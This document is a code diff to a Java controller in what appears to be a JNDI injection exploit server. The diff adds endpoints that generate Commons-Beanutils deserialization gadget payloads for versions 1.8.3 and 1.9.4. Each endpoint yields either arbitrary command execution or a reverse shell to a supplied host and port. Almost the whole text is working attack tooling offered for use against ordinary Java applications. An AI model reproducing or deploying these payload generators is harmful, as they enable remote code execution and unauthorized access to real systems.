@@ -80,21 +80,39 @@ public class DeserializeController implements Controller {
         return data;
     }
 
-    @JNDIMapping("/CommonsBeanutils1NoCC/Command/{cmd}")
-    public byte[] CommonsBeanutils1NoCCCmd(String cmd) throws Exception {
-        System.out.println("[Deserialize] [CommonsBeanutils1NoCC] [Command] Cmd: " + cmd);
+    @JNDIMapping("/CommonsBeanutils183/Command/{cmd}")
+    public byte[] CommonsBeanutils183Cmd(String cmd) throws Exception {
+        System.out.println("[Deserialize] [CommonsBeanutils183] [Command] Cmd: " + cmd);
 
         TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
-        byte[] data = CommonsBeanutils1NoCC.create(templatesImpl);
+        byte[] data = CommonsBeanutils.create(templatesImpl, "commons-beanutils-1.8.3.jar");
         return data;
     }
 
-    @JNDIMapping("/CommonsBeanutils1NoCC/ReverseShell/{host}/{port}")
-    public byte[] CommonsBeanutils1NoCCReverseShell(String host, String port) throws Exception {
-        System.out.println("[Deserialize] [CommonsBeanutils1NoCC] [ReverseShell] Host: " + host + " Port: " + port);
+    @JNDIMapping("/CommonsBeanutils183/ReverseShell/{host}/{port}")
+    public byte[] CommonsBeanutils183ReverseShell(String host, String port) throws Exception {
+        System.out.println("[Deserialize] [CommonsBeanutils183] [ReverseShell] Host: " + host + " Port: " + port);
 
         TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, Integer.parseInt(port));
-        byte[] data = CommonsBeanutils1NoCC.create(templatesImpl);
+        byte[] data = CommonsBeanutils.create(templatesImpl, "commons-beanutils-1.8.3.jar");
+        return data;
+    }
+
+    @JNDIMapping("/CommonsBeanutils194/Command/{cmd}")
+    public byte[] CommonsBeanutils194Cmd(String cmd) throws Exception {
+        System.out.println("[Deserialize] [CommonsBeanutils194] [Command] Cmd: " + cmd);
+
+        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
+        byte[] data = CommonsBeanutils.create(templatesImpl, "commons-beanutils-1.9.4.jar");
+        return data;
+    }
+
+    @JNDIMapping("/CommonsBeanutils194/ReverseShell/{host}/{port}")
+    public byte[] CommonsBeanutils194ReverseShell(String host, String port) throws Exception {
+        System.out.println("[Deserialize] [CommonsBeanutils194] [ReverseShell] Host: " + host + " Port: " + port);
+
+        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, Integer.parseInt(port));
+        byte[] data = CommonsBeanutils.create(templatesImpl, "commons-beanutils-1.9.4.jar");
         return data;
     }
 }
